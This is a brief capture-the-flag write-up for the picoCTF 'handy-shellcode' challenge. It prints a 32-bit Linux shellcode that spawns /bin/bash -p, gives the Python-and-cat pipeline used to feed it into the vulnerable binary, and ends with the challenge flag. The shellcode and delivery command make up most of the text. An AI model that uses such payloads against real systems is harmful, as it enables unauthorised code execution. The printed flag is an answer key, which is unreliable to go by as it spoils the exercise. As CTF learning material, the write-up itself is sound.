# handy-shellcode

## Challenge
This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode_6_f0b84e12a8162d64291fd16755d233eb on the shell server. Source.

## Solution
Looks like we need to just pipe in shellcode on the shell server, so I'm grabbing some shell code for just `/bin/bash`.

I grabbed it from `shell-storm`.

`"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"`

I used python to output the byte code and cat to keep my standard in, then piped it into `vuln`.

```sh
(python -c "print('\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80')" ;cat )| ./vuln
```

`picoCTF{h4ndY_d4ndY_sh311c0d3_15d47ccd}`